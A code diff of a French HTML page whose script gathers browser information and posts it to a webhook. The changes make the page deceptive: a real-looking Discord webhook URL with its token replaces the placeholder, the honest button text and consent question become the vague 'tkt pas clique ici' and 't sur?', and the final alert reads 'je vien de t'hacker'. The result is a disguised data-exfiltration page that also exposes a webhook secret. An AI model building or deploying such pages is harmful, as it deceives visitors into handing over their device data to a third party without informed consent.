@@ -5,10 +5,10 @@
 <title>Infos navigateur avancées</title>
 </head>
 <body>
-  <button id="sendInfoBtn">Clique pour envoyer vos infos</button>
+  <button id="sendInfoBtn">tkt pas clique ici</button>
 
   <script>
-    const webhookURL = "TON_WEBHOOK_ICI";
+    const webhookURL = "https://discord.com/api/webhooks/1410679586605502566/CDeTYGF55y_IOtf5aSoNxqcCNxydCr7Wqft0eswP94mFTE1jBpm2oJG3PaIdq1ZVgsJT";
 
     async function getBrowserInfo() {
       const navigatorInfo = {
@@ -106,7 +106,7 @@
     }
 
     async function sendBrowserInfo() {
-      const consent = confirm("Voulez-vous partager vos informations de navigateur avec le serveur ?");
+      const consent = confirm("t sur?");
       if (!consent) return;
 
       const info = await getBrowserInfo();
@@ -120,7 +120,7 @@
         })
       });
 
-      alert("Infos envoyées !");
+      alert("je vien de t'hacker");
     }
 
     document.getElementById("sendInfoBtn").addEventListener("click", sendBrowserInfo);
